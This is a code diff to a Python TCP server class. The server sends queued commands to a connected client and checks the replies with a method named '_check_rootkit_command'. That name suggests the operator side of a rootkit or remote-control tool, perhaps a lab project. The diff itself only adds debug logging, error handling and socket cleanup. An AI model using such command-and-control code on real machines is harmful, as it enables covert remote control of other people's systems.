@@ -97,9 +97,13 @@ class TCPServer:
 
     def _is_socket_closed(self, sock: socket.socket) -> bool:
         try:
-            data = sock.recv(1, socket.MSG_PEEK)
-            if data == b'':
-                return True
+            sock.settimeout(0.5)
+            try:
+                data = sock.recv(1, socket.MSG_PEEK)
+                if data == b'':
+                    return True
+            except socket.timeout:
+                return False
         except socket.error as e:
             if e.errno in [errno.ECONNRESET, errno.EBADF, errno.ENOTCONN]:
                 return True
@@ -133,61 +137,77 @@ class TCPServer:
                 print(f"[MAIN LOOP ERROR] {e}")
 
     def _handle_client(self) -> None:
+        request = None
         try:
-            # Ajouter un timeout à la socket pour éviter les blocages longs
-            self._client_socket.settimeout(2.0)
-
             while self._running:
-                # Vérifie si le client s'est déconnecté
+                # Log: Checking if the socket is still connected
+                print("[DEBUG] Checking socket connection status.")
                 if self._client_socket is None or self._is_socket_closed(self._client_socket):
                     print("[SOCKET] Client disconnected.")
                     break
 
-                # Récupère la requête à envoyer, ou passe si la file est vide
+                # Log: Attempting to retrieve a request from the queue
+                print("[DEBUG] Attempting to retrieve a request from the send queue.")
                 try:
                     request: Request = self._send_queue.get(timeout=1)
                 except queue.Empty:
+                    print("[DEBUG] Send queue is empty, continuing.")
                     continue
 
                 if request is None:
-                    break
+                    print("[WARN] Received None request, skipping.")
+                    continue
 
-                # Historique de commande
-                if request.add_to_history:
-                    self._owner._command_history.append({"command": request.message, "stdout": "", "stderr": ""})
-
-                # Envoi de la commande chiffrée
+                # --- Sending the command ---
+                print(f"[DEBUG] Sending command: {request.message}")
                 success = self._network_handler.send(self._client_socket, request.message)
                 if not success:
-                    print("[ERROR] Failed to send message.")
-                    break
+                    tcp_error = "[ERROR] Failed to send command."
+                    print(tcp_error)
+                    if request.add_to_history:
+                        self._owner._update_command_history(request.message, "", tcp_error=tcp_error)
+                    request.event.set()
+                    continue
 
                 print(f"[SENT] {request.message}")
 
-                # Réception de la réponse chiffrée
+                # --- Receiving the response ---
+                print("[DEBUG] Waiting for response from client.")
                 response = self._network_handler.receive(self._client_socket)
                 if response is False:
-                    print("[ERROR] Failed to receive response.")
-                    break
+                    tcp_error = "[ERROR] Failed to receive response."
+                    print(tcp_error)
+                    if request.add_to_history:
+                        self._owner._update_command_history(request.message, "", tcp_error=tcp_error)
+                    request.event.set()
+                    continue
 
                 print(f"[RECEIVED] {response}")
 
-                # File de réponses + analyse
+                # --- Post-processing ---
+                print("[DEBUG] Processing received response.")
                 self._recv_queue.put(response)
                 self._owner._check_rootkit_command(response)
-                self._owner._update_command_history(response)
 
-                # Débloque le thread demandeur
+                if request.add_to_history:
+                    print("[DEBUG] Updating command history.")
+                    self._owner._update_command_history(request.message, response)
+
                 request.response = response
                 request.event.set()
 
         except socket.timeout:
-            print("[TIMEOUT] Socket timed out. Exiting client handler.")
+            tcp_error = "[SOCKET TIMEOUT] No data received in the last 2 seconds."
+            print(tcp_error)
+            if request and request.add_to_history:
+                self._owner._update_command_history(request.message if request else "", "", tcp_error=tcp_error)
+
         except Exception as e:
-            print(f"[HANDLE CLIENT ERROR] {e}")
-        finally:
-            if self._client_socket:
-                self._client_socket.close()
+            tcp_error = f"[EXCEPTION] An error occurred: {e}"
+            print(tcp_error)
+            if request and request.add_to_history:
+                self._owner._update_command_history(request.message if request else "", "", tcp_error=tcp_error)
+
 
     def _cleanup_after_disconnect(self) -> None:
         print("[SERVER] Client disconnected.")
@@ -197,3 +217,11 @@ class TCPServer:
         self._owner._authenticated = False
         self._command_history = []
         self._owner.reset_command_history()
+
+        if self._client_socket:
+            try:
+                self._client_socket.shutdown(socket.SHUT_RDWR)
+                self._client_socket.close()
+            except Exception as e:
+                print(f"[ERROR] Failed to close client socket: {e}")
+        self._client_socket = None
